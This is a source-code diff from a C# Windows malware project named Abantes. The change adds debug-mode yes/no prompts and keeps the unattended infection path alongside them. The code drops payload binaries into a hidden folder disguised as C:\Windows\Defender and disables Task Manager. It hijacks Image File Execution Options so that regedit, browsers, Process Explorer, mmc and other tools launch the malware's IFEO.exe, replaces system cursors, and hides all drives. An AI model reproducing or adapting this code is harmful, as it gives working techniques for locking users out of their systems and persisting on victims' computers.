@@ -37,24 +37,51 @@ namespace Abantes
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
             {
-                Directory.CreateDirectory(@"C:\Windows\Defender");
-                File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
-                File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
-                File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
-                File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
-                File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
-                File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
-                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
-                File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
-                File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
-                File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
-                File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
-                File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
-                Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
-                File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
+                if (MainThread.Mode == 1)
+                {
+                    if (MessageBox.Show("EXTRACT RESOURCES?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                    {
+                        Directory.CreateDirectory(@"C:\Windows\Defender");
+                        File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
+                        File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
+                        File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
+                        File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
+                        File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
+                        File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                        File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
+                        File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
+                        File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
+                        File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
+                        File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
+                        File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
+                        Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
+                        File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
-                DirectoryInfo ch = new DirectoryInfo(extractPath);
-                ch.Attributes = FileAttributes.Hidden;
+                        DirectoryInfo ch = new DirectoryInfo(extractPath);
+                        ch.Attributes = FileAttributes.Hidden;
+                    }
+                }
+                else
+                {
+                    Directory.CreateDirectory(@"C:\Windows\Defender");
+                    File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
+                    File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
+                    File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
+                    File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
+                    File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
+                    File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                    File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
+                    File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
+                    File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
+                    File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
+                    File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
+                    File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
+                    Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
+                    File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
+
+                    DirectoryInfo ch = new DirectoryInfo(extractPath);
+                    ch.Attributes = FileAttributes.Hidden;
+                }
 
                 Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
 
@@ -87,131 +114,281 @@ namespace Abantes
                 editKey.SetValue("DisableTaskMgr", "1");
                 editKey.Close();
 
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DVDMaker.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wordpad.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgradeui.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgrade.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StikyNot.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ehshell.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
-                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
-                editKey.Close();
+                if (MainThread.Mode == 1)
+                {
+                    if (MessageBox.Show("INFECT IFEO?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                    {
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DVDMaker.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wordpad.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgradeui.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgrade.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StikyNot.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ehshell.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
+                        editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                        editKey.Close();
+                    }
+                }
+                else
+                {
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DVDMaker.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wordpad.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgradeui.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WindowsAnytimeUpgrade.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StikyNot.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ehshell.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
+                    editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                    editKey.Close();
+                }
 
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("Hand", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("Wait", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("AppStarting", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("Help", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("UpArrow", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("No", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("SizeWE", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("SizeNWSE", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("SizeNS", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("SizeNESW", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("SizeAll", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-                editKey.SetValue("NWPen", extractPath + "\\cursor.cur");
-                editKey.Close();
-                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse");
-                editKey.SetValue("MouseTrails", "7");
-                editKey.Close();
+                if (MainThread.Mode == 1)
+                {
+                    if (MessageBox.Show("CHANGE CURSOR?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                    {
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("Hand", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("Wait", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("AppStarting", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("Help", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("UpArrow", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("No", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("SizeWE", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("SizeNWSE", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("SizeNS", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("SizeNESW", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("SizeAll", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                        editKey.SetValue("NWPen", extractPath + "\\cursor.cur");
+                        editKey.Close();
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse");
+                        editKey.SetValue("MouseTrails", "7");
+                        editKey.Close();
+                    }
+                }
+                else
+                {
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("Hand", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("Wait", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("AppStarting", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("Help", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("UpArrow", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("No", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("SizeWE", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("SizeNWSE", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("SizeNS", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("SizeNESW", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("SizeAll", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                    editKey.SetValue("NWPen", extractPath + "\\cursor.cur");
+                    editKey.Close();
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse");
+                    editKey.SetValue("MouseTrails", "7");
+                    editKey.Close();
+                }
 
-                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
-                editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
-                editKey.Close();
